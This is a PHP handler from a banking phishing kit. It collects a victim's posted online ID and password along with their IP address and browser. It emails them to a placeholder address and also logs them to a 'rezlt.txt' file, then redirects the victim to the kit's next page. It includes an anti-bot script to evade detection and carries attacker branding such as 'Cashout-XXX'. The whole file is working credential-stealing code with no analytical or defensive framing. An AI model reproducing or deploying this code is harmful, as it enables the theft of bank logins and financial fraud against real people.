<?php
$zabi = getenv("REMOTE_ADDR");
include 'antibots.php';
$message .= "------------------ Mr aroug  ---------------------\n";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "--------------  LOGIN -------------\n";
$message .= "Onlineid : ".$_POST['Onlineid']."\n";
$message .= "Password : ".$_POST['Password']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Mou Ad  ----------------------\n";
$subject = "B4nK Login [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$send = "your-email-here";
$headers = "From: Cashout-XXX <service@>\r\n";
mail($send,$subject,$message,$headers);
    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
mail(','.$form,$subject,$message,$headers);

header("Location: ../001.php");?>